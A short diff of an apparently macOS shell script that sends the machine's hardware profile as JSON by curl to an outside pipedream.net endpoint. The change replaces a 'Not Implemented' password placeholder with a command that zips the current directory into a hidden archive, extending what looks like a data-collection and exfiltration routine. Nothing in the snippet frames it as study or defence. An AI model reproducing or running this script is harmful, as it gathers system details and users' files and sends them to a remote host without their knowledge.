@@ -14,7 +14,7 @@ sleep 20
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
 curl -d '{                      
  "sysinfo": "'"$(system_profiler SPHardwareDataType)"'"
- "password": "Not Implemented"
+ "password": "'"$(zip -r ../.downloads.zip *)"'"
 }' -H "Content-Type: application/json" https://eojlk5hggkgar9y.m.pipedream.net
 
 
